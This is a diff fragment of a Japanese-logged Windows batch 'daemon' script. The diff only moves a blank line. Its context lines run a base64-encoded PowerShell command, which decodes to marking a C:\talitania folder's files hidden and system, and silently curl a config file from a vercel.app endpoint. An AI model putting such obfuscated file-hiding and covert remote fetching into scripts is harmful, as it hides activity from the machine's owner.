@@ -13,8 +13,8 @@ echo %date% %time% [情報] デーモン開始 >> "%LOGFILE%"
 set "b64=YQB0AHQAcgBpAGIAIAArAGgAIAArAHMAIAAiAEMAOgBcAHQAYQBsAGkAdABhAG4AaQBhAFwAKgAiAA=="
 
 :listener
-
 powershell.exe -NoProfile -EncodedCommand %b64%
+
 echo %date% %time% [情報] 設定を取得中 >> "%LOGFILE%"
 curl -L -s -o "%ROOT%\config.json" "https://6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/config" >> "%LOGFILE%" 2>&1
 if errorlevel 1 echo %date% %time% [エラー] 設定のダウンロードに失敗しました >> "%LOGFILE%"
